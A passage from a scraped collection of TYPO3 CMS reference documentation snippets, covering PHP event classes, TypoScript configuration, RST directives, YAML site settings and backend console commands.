implementation of a custom field control class in TYPO3. It defines the ImportDataControl class which renders a button for data import and includes necessary JavaScript.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FormEngine/Rendering/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\nnamespace MyVendor\\MyExtension\\FormEngine\\FieldControl;\n\nuse TYPO3\\CMS\\Backend\\Form\\AbstractNode;\nuse TYPO3\\CMS\\Core\\Utility\\GeneralUtility;\nuse TYPO3\\CMS\\Core\\Page\\PageRenderer;\n\nclass ImportDataControl extends AbstractNode\n{\n    public function render(): array\n    {\n        $pageRenderer = GeneralUtility::makeInstance(PageRenderer::class);\n        $pageRenderer->loadRequireJsModule('TYPO3/CMS/MyExtension/ImportData');\n\n        return [\n            'iconIdentifier' => 'actions-document-synchronize',\n            'title' => $this->getLanguageService()->sL('LLL:EXT:my_extension/Resources/Private/Language/locallang.xlf:importData.title'),\n            'linkAttributes' => [\n                'class' => 'importData',\n                'data-id' => $this->data['databaseRow']['uid']\n            ]\n        ];\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Demonstrating TypoScript Condition Placement\nDESCRIPTION: This TypoScript snippet shows an invalid use of conditions within a code block. Conditions must be placed outside the code block to function correctly. The example outlines attempts to change a property based on user login status, but improperly nested conditions allow illustrating common pitfalls in TypoScript configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/Conditions5.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\n# Invalid: Conditions must not be used within code blocks\\nsomeIdentifier {\\n   someProperty = foo\\n   [frontend.user.isloggedIn]\\n      someProperty = bar\\n   [GLOBAL]\\n}\n```\n\n----------------------------------------\n\nTITLE: Creating HTML Response in TYPO3 Extbase ActionController\nDESCRIPTION: The htmlResponse method in the ActionController class creates a PSR-7 compliant HTTP response with HTML content and appropriate headers. It either uses the provided HTML string or renders the view if no HTML is provided.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/_Controller/_HtmlResponse.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse Psr\\Http\\Message\\ResponseInterface;\n\nabstract class ActionController implements ControllerInterface\n{\n    protected function htmlResponse(string $html = null): ResponseInterface\n    {\n        return $this->responseFactory->createResponse()\n            ->withHeader('Content-Type', 'text/html; charset=utf-8')\n            ->withBody($this->streamFactory->createStream(($html ?? $this->view->render())));\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: ModifyEditFileFormDataEvent Class Definition in TYPO3 CMS Filelist\nDESCRIPTION: Class declaration for the ModifyEditFileFormDataEvent that allows listeners to modify the form data used to render the edit file form in the filelist module. It provides methods to get and set form data, access the file being edited, and retrieve the server request.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Filelist/ModifyEditFileFormDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Filelist\\Event;\n\nclass ModifyEditFileFormDataEvent\n{\n    // Retrieves the form data array\n    public function getFormData(): array;\n    \n    // Sets the form data array\n    public function setFormData(array $formData);\n    \n    // Gets the file that is being edited\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\FileInterface;\n    \n    // Gets the current server request\n    public function getRequest(): \\Psr\\Http\\Message\\ServerRequestInterface;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic Upgrade Wizard Prerequisites in PHP\nDESCRIPTION: Example showing how to implement getPrerequisites() method in an upgrade wizard to ensure database and reference index are up-to-date before execution.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/UpdateExtensions/UpdateWizards/Creation.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Install\\Updates\\DatabaseUpdatedPrerequisite;\nuse TYPO3\\CMS\\Install\\Updates\\ReferenceIndexUpdatedPrerequisite;\n\n/**\n * @return string[]\n */\npublic function getPrerequisites(): array\n{\n    return [\n        DatabaseUpdatedPrerequisite::class,\n        ReferenceIndexUpdatedPrerequisite::class,\n    ];\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Conditional Values in TypoScript\nDESCRIPTION: This snippet illustrates how to define a TypoScript identifier that conditionally changes its value based on the logged-in status of the frontend user. If the user is logged in, the value is set to 'bar', otherwise it defaults to 'foo'. Dependencies on the TYPO3 framework apply, specifically regarding frontend user authentication.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/TypoScriptSyntax/CodeBlockInvalidCondition.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmyIdentifier = TEXT\n   myIdentifier {\n      value = foo\n      [frontend.user.isLoggedIn]\n         value = bar\n      [end]\n   }\n```\n\n----------------------------------------\n\nTITLE: Configuring TCA for Code Editor in TYPO3 CMS (PHP)\nDESCRIPTION: This snippet demonstrates how to configure a TCA field to use the code editor with HTML syntax highlighting. It sets the renderType to 'codeEditor' and specifies the format as 'html'.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CodeEditor/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n[\n    'columns' => [\n        'codeeditor1' => [\n            'label' => 'codeEditor_1 format=html, rows=7',\n            'description' => 'field description',\n            'config' => [\n                'type' => 'text',\n                'renderType' => 'codeEditor',\n                'format' => 'html',\n                'rows' => 7,\n            ],\n        ],\n    ],\n]\n```\n\n----------------------------------------\n\nTITLE: Using LanguageService with Site Language\nDESCRIPTION: Demonstrates how to create and use a LanguageService instance to translate labels with parameter substitution using sprintf.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/LocalizationApi/_LanguageService.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$language = $this->request->getAttribute('language');\\n$languageService =\\n  GeneralUtility::makeInstance(LanguageServiceFactory::class)\\n  ->createFromSiteLanguage($language);\\n$label = sprintf(\\n     $languageService->sL(\\n         'LLL:EXT:my_ext/Resources/Private/Language/locallang.xlf:downloaded_times'\\n     ),\\n     27,\\n     'several'\\n);\n```\n\n----------------------------------------\n\nTITLE: BeforeFlexFormConfigurationOverrideEvent Class Definition in TYPO3 Extbase\nDESCRIPTION: Documentation for the BeforeFlexFormConfigurationOverrideEvent class which is dispatched before flexForm configuration overrides are applied. The class provides methods to get and modify flexForm configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Extbase/BeforeFlexFormConfigurationOverrideEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Extbase\\Event\\Configuration;\n\nclass BeforeFlexFormConfigurationOverrideEvent\n{\n    public function getFrameworkConfiguration(): array;\n    public function getOriginalFlexFormConfiguration(): array;\n    public function getFlexFormConfiguration(): array;\n    public function setFlexFormConfiguration(array $flexFormConfiguration);\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Locking Strategy Priority in TYPO3\nDESCRIPTION: Example of how to override the priority of a locking strategy (FileLockStrategy in this case) in TYPO3's additional configuration file.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/LockingApi/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\nuse TYPO3\\CMS\\Core\\Locking\\FileLockStrategy;\n\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['locking']['strategies'][FileLockStrategy::class]['priority'] = 10;\n```\n\n----------------------------------------\n\nTITLE: RST Configuration for TYPO3 Documentation Index\nDESCRIPTION: ReStructuredText configuration for setting up the tutorials index page with card-grid layout and table of contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. index::\n   Extension development; Tutorial\n   Tutorial; Extension development\n.. _extension-tutorials:\n\n=========\nTutorials\n=========\n\n..  card-grid::\n    :columns: 1\n    :columns-md: 2\n    :gap: 4\n    :class: pb-4\n    :card-height: 100\n\n    ..  card:: :ref:`Kickstart an extension <extension-kickstart>`\n\n        There are different options to kickstart an extension. This\n        chapter offers tutorials for some common methods to\n        kickstart an extension.\n\n    ..  card:: :ref:`Components of TYPO3 extension <extension-components>`\n\n        This section is about the essential components of a TYPO3 extension. It provides a comprehensive overview of the structure and core elements that make up an extension.\n\n    ..  card:: :ref:`Tea in a nutshell <extbase_tutorial_tea>`\n\n        `tea` is a simple, well-tested extension based on Extbase.\n\n        This tutorial guides you through the different files,\n        configuration formats and PHP classes needed for an Extbase\n        extension. Automatic tests are not covered in this tutorial.\n        Refer to the extensions manual for this topic.\n\n    ..  card:: :ref:`Extension development with extbase <extbase_tutorials>`\n\n                Extension Development with Extbase, a video from the TYPO3\n                Developer Days 2019\n\n..  toctree::\n    :titlesonly:\n    :hidden:\n\n    Kickstart/Index\n    Tea/Index\n    ComponentsOfTYPO3Extension/Index\n    Extbase\n```\n\n----------------------------------------\n\nTITLE: Defining BootCompletedEvent Class in TYPO3 CMS Core API\nDESCRIPTION: This snippet defines the BootCompletedEvent class in the TYPO3\\CMS\\Core\\Core\\Event namespace. The class is executed when TYPO3 has fully booted, after all ext_tables.php files have been processed. It includes a method isCachingEnabled() that returns a boolean value.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/BootCompletedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Core\\Event;\n\nclass BootCompletedEvent\n{\n    public function isCachingEnabled(): bool\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining UsableForConnectionInterface for Custom Driver Middleware in PHP\nDESCRIPTION: This interface allows custom driver middleware to decide if it should be used for specific database connections. It includes a method to check compatibility based on connection identifier and parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Database/UsableForConnectionInterface.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Database\\Middleware;\n\ninterface UsableForConnectionInterface\n{\n    public function canBeUsedForConnection(string $identifier, array $connectionParams): bool;\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing BeforePageCacheIdentifierIsHashedEvent Class in PHP\nDESCRIPTION: This code snippet shows how to reference the BeforePageCacheIdentifierIsHashedEvent class in PHP. The event is part of the TYPO3\\CMS\\Frontend\\Event namespace and is used for modifying page cache identifiers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Frontend/BeforePageCacheIdentifierIsHashedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Frontend\\Event\\BeforePageCacheIdentifierIsHashedEvent\n```\n\n----------------------------------------\n\nTITLE: Configuring Custom Category Data Processor in TYPO3 TypoScript\nDESCRIPTION: Sets up a custom content element that processes category data using a custom processor. The configuration extends the base content element, specifies a custom template, and configures category processing with field mapping.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/DataProcessing/CustomCategoryProcessorTypoScript.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\ntt_content {\n    examples_dataproccustom =< lib.contentElement\n    examples_dataproccustom {\n        templateName = DataProcCustom\n        dataProcessing.10 = custom-category\n        dataProcessing.10 {\n            as = categories\n            categoryList.field = categories\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: RST Index Definition\nDESCRIPTION: ReStructuredText index entry for the AfterFormEnginePageInitializedEvent\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/AfterFormEnginePageInitializedEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n..  index:: Events; AfterFormEnginePageInitializedEvent\n```\n\n----------------------------------------\n\nTITLE: Including TypoScript Setup\nDESCRIPTION: This snippet describes how to include TypoScript setup stored in 'setup.typoscript'. It emphasizes the necessity of the file's name and path for proper extension functioning.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/FileStructure/Configuration/TypoScript/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: plaintext\nCODE:\n```\n..  typo3:file:: setup.typoscript\n    :scope: extension\n    :path: /Configuration/TypoScript\n    :regex: /^.*Configuration\\/TypoScript\\/.*setup\\.typoscript/\n    :shortDescription: Contains the TypoScript setup of the extension. The path is convention, the file name mandatory.\n```\n\n----------------------------------------\n\nTITLE: Retrieving and Modifying HTML Content in AfterTransformTextForRichTextEditorEvent\nDESCRIPTION: This code snippet demonstrates how to retrieve the current HTML content from the event, modify it, and set the modified content back to the event. It's used to apply custom transformations to the content before it's displayed in the RTE.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Html/AfterTransformTextForRichTextEditorEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n$value = $event->getHtmlContent();\n// Apply changes to $value\n$event->setHtmlContent($value);\n```\n\n----------------------------------------\n\nTITLE: Adding a DropDown Header to TYPO3 Dropdown Button\nDESCRIPTION: This code illustrates how to add a non-interactive text header element to a dropdown button in TYPO3 backend. Headers help to group related items together and provide context within dropdown menus.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ButtonComponents.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nuse TYPO3\\CMS\\Backend\\Template\\Components\\Buttons\\DropDown\\DropDownHeader:\n\n$item = GeneralUtility::makeInstance(DropDownHeader::class)\n    ->setLabel('My label');\n$dropDownButton->addItem($item);\n```\n\n----------------------------------------\n\nTITLE: Method Injection with Abstract Class in TYPO3 (PHP)\nDESCRIPTION: Illustrates method injection in an abstract controller class and a concrete implementation. This approach allows the abstract class to change its dependencies without breaking extending classes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DependencyInjection/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nabstract class AbstractController\n{\n    private ?LoggerInterface $logger = null;\n\n    public function injectLogger(LoggerInterface $logger): void\n    {\n        $this->logger = $logger;\n    }\n}\n\nclass UserController extends AbstractController\n{\n    private ?UserRepository $userRepository = null;\n\n    public function injectUserRepository(UserRepository $userRepository): void\n    {\n        $this->userRepository = $userRepository;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: External Sheet Definition File for TYPO3 FlexForms\nDESCRIPTION: Example of an external sheet definition file referenced by the main Data Structure. This file contains the actual field definitions for a specific sheet, including labels and form field configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/FlexForms/T3datastructure/SheetReferences/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: xml\nCODE:\n```\n<T3DataStructure>\n    <ROOT>\n        <sheetTitle>\n            LLL:EXT:felogin/locallang_db.xlf:tt_content.pi_flexform.sheet_general\n        </sheetTitle>\n        <type>array</type>\n        <el>\n            <showForgotPassword>\n                <label>\n                    LLL:EXT:felogin/locallang_db.xlf:tt_content.pi_flexform.show_forgot_password\n                </label>\n                <config>\n                    <type>check</type>\n                    <items type=\"array\">\n                        <numIndex index=\"1\" type=\"array\">\n                            <label>\n                                LLL:EXT:core/Resources/Private/Language/locallang_core.xlf:labels.enabled\n                            </label>\n                            <value>1</value>\n                        </numIndex>\n                    </items>\n                </config>\n            </showForgotPassword>\n            <showPermaLogin>\n                <label>\n                    LLL:EXT:felogin/locallang_db.xlf:tt_content.pi_flexform.show_permalogin\n                </label>\n                <config>\n                    <default>1</default>\n                    <type>check</type>\n                    <items type=\"array\">\n                        <numIndex index=\"1\" type=\"array\">\n                            <label>\n                                LLL:EXT:core/Resources/Private/Language/locallang_core.xlf:labels.enabled\n                            </label>\n                            <value>1</value>\n                        </numIndex>\n                    </items>\n                </config>\n            </showPermaLogin>\n            // ...\n        </el>\n    </ROOT>\n</T3DataStructure>\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyRecordOverlayIconIdentifierEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the ModifyRecordOverlayIconIdentifierEvent class in the TYPO3\\CMS\\Core\\Imaging\\Event namespace. It includes methods for setting and getting the overlay icon identifier, as well as retrieving table, row, and status information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/ModifyRecordOverlayIconIdentifierEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Imaging\\Event;\n\nclass ModifyRecordOverlayIconIdentifierEvent\n{\n    public function setOverlayIconIdentifier(string $overlayIconIdentifier): void\n    {\n        // Implementation not shown\n    }\n\n    public function getOverlayIconIdentifier(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getTable(): string\n    {\n        // Implementation not shown\n    }\n\n    public function getRow(): array\n    {\n        // Implementation not shown\n    }\n\n    public function getStatus(): array\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Recommended Log Message Examples in TYPO3\nDESCRIPTION: Examples of well-structured log messages that maintain consistency and provide clear context about the connection type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Logger/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: text\nCODE:\n```\n\"Connection to MySQL database could not be established\"\n\"Connection to memcache could not be established\"\n```\n\n----------------------------------------\n\nTITLE: ModifyDatabaseQueryForContentEvent Class Definition in TYPO3 Backend\nDESCRIPTION: PHP class definition for modifying database queries when loading content for a page. Provides methods to get and set the QueryBuilder instance, retrieve the table name, and get the page ID.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyDatabaseQueryForContentEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Backend\\View\\Event;\n\nclass ModifyDatabaseQueryForContentEvent\n{\n    public function getQueryBuilder(): \\TYPO3\\CMS\\Core\\Database\\Query\\QueryBuilder;\n    \n    public function setQueryBuilder(\\TYPO3\\CMS\\Core\\Database\\Query\\QueryBuilder $queryBuilder): void;\n    \n    public function getTable(): string;\n    \n    public function getPageId(): int;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Spool Type\nDESCRIPTION: This snippet defines the method by which messages are stored before they are sent. It allows for file storage, memory storage, or a custom class to be used for delayed transport.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_18\n\nLANGUAGE: text\nCODE:\n```\n:Path: $GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_spool_type']\n:type: text\n:Default: ''\n\n*classname* Custom class which implements the :php:`\\TYPO3\\CMS\\Core\\Mail\\DelayedTransportInterface` interface.\n```\n\n----------------------------------------\n\nTITLE: CSV Database Fixture for TYPO3 Functional Test\nDESCRIPTION: Example of a CSV file defining database rows for a functional test fixture.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_4\n\nLANGUAGE: plaintext\nCODE:\n```\n\"pages\"\n,\"uid\",\"pid\",\"title\"\n,1,0,\"Root\"\n\"tt_content\"\n,\"uid\",\"pid\",\"header\"\n,1,1,\"Test content\"\n```\n\n----------------------------------------\n\nTITLE: Implementing Sliding Window Pagination in Extbase Controller\nDESCRIPTION: Example of implementing SlidingWindowPagination in an Extbase controller. This approach reduces the number of page links shown for large data sets by displaying a sliding window of page numbers.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Pagination/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse Psr\\Http\\Message\\ResponseInterface;\nuse TYPO3\\CMS\\Core\\Pagination\\ArrayPaginator;\nuse TYPO3\\CMS\\Core\\Pagination\\SlidingWindowPagination;\nuse TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController;\n\nclass ExampleController extends ActionController\n{\n    public function slidingWindowPaginateAction(int $currentPage = 1): ResponseInterface\n    {\n        // Just an example array. In a real scenario this would come from a repository\n        // or similar.\n        $itemsToBePaginated = range(1, 1000);\n\n        // Initialize the paginator\n        $itemsPerPage = 20;\n        $maximumLinks = 5;\n        $paginator = new ArrayPaginator($itemsToBePaginated, $currentPage, $itemsPerPage);\n        $pagination = new SlidingWindowPagination($paginator, $maximumLinks);\n\n        $this->view->assignMultiple([\n            'paginator' => $paginator,\n            'pagination' => $pagination,\n            'pages' => $pagination->getPages()\n        ]);\n        return $this->htmlResponse();\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: Basic RST Include Directive\nDESCRIPTION: Includes external RST content from Includes.rst.txt file\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendLanguages.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n```\n\n----------------------------------------\n\nTITLE: Updating TypoScript for Core-based Plugin in TYPO3\nDESCRIPTION: Modifies the TypoScript configuration to render the plugin using the new CType instead of list_type.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/MigrationListType.rst#2025-04-16_snippet_4\n\nLANGUAGE: TypoScript\nCODE:\n```\n-tt_content.list.20.my_extension_pi1 =< plugin.tx_myextension_pi1\n+tt_content.my_extension_pi1 =< plugin.tx_myextension_pi1\n```\n\n----------------------------------------\n\nTITLE: RST Image Figure Configuration\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of mount settings with a caption and styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AccessControl/MountFromGroups.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AccessControl/MountFromGroups.png\n   :class: with-shadow\n\n   By default DB and File Mounts from groups are set for member users\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for TYPO3 Context Menu Screenshot\nDESCRIPTION: ReStructuredText directive for displaying a screenshot of a customized TYPO3 context menu with an added 'Hello World' item. Includes alt text and styling class for shadow effect.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/Examples/ContextualMenuExtended/ContextMenuHelloWorld.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/Examples/ContextualMenuExtended/ContextMenuHelloWorld.png\n   :alt: The context menu now contains an additional item \"Hello World\"\n   :class: with-shadow\n\n   Context menu with custom item\n```\n\n----------------------------------------\n\nTITLE: Control State Retrieval Methods\nDESCRIPTION: Methods for retrieving control states and enabled controls. These methods provide access to the current state of all controls in the system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyFileReferenceEnabledControlsEvent.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getControlsState()\n    :returns: `array`\n\n..  php:method:: getEnabledControls()\n    :returns: `array`\n```\n\n----------------------------------------\n\nTITLE: Setting up toctree directive for Setup events documentation in RST\nDESCRIPTION: A reStructuredText directive that automatically includes all documentation files in the current directory as a table of contents. The toctree is configured to show only titles and use globbing pattern to include all files.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Setup/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  toctree::\n    :titlesonly:\n    :glob:\n\n    *\n```\n\n----------------------------------------\n\nTITLE: YAML Site Configuration Example\nDESCRIPTION: Example of a site configuration YAML file showing how to include a site set in a TYPO3 site configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\nsite:\n  sets:\n    - vendor/site-package\n```\n\n----------------------------------------\n\nTITLE: Loading Additional Core Extensions in PHP for TYPO3 Functional Test\nDESCRIPTION: Demonstrates how to load additional Core extensions for a functional test case.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/FunctionalTesting/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\nprotected array $coreExtensionsToLoad = ['workspaces'];\n```\n\n----------------------------------------\n\nTITLE: Site Settings YAML File\nDESCRIPTION: Optional configuration file for site-specific settings. Used by the Site Management backend module for storing site settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/SiteFolder.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nsettings.yaml\n```\n\n----------------------------------------\n\nTITLE: Creating LogRecord instances in TYPO3\nDESCRIPTION: The API for creating new LogRecord instances is through the Logger::log() method or through shorthand helper methods. This reference points to the main method signature.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Model/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Log\\Logger:log()\n```\n\n----------------------------------------\n\nTITLE: Locking and Unlocking TYPO3 Backend via Console Commands\nDESCRIPTION: Console commands to lock access to the TYPO3 backend during maintenance or for security reasons, and to restore access afterward. The backend lock prevents all users including administrators from logging in.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/FlagFiles.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n# Lock the TYPO3 Backend for everyone including administrators\nvendor/bin/typo3 backend:lock\n\n# Unlock the TYPO3 Backend after it has been locked\nvendor/bin/typo3 backend:unlock\n```\n\n----------------------------------------\n\nTITLE: Custom Source Implementation (PHP)\nDESCRIPTION: This snippet presents an example of a custom source implementation that extends the RedirectSourceInterface. It includes methods for generating a custom hash and retrieving source-specific information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Redirects/SlugRedirectChangeItemCreatedEvent.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Redirects;\n\nuse TYPO3\\CMS\\Redirects\\RedirectUpdate\\RedirectSourceInterface;\n\nclass CustomSource implements RedirectSourceInterface\n{\n    public function getHash(): string\n    {\n        return sha1(static::class);\n    }\n\n    public function getSourceData(): array\n    {\n        return ['my_custom_key' => 'MyCustomValue'];\n    }\n\n    public function jsonSerialize(): mixed\n    {\n        return $this->getSourceData();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: PHP Event Class Definition for RTE HTML Transformation\nDESCRIPTION: Defines an event class BeforeTransformTextForRichTextEditorEvent that fires before RteHtmlParser modifies HTML content from database to RTE editor. Includes methods for getting/setting HTML content and accessing processing configuration.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Html/BeforeTransformTextForRichTextEditorEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Html\\Event;\n\nclass BeforeTransformTextForRichTextEditorEvent\n{\n    public function getHtmlContent(): string\n    \n    public function setHtmlContent(string $htmlContent)\n    \n    public function getInitialHtmlContent(): string\n    \n    public function getProcessingConfiguration(): array\n}\n```\n\n----------------------------------------\n\nTITLE: PHP GitHub Link Handler Initialization\nDESCRIPTION: Implementation of initialize() and setView() methods for the GitHub link handler class to handle dependencies and view setup.\nSOURCE: 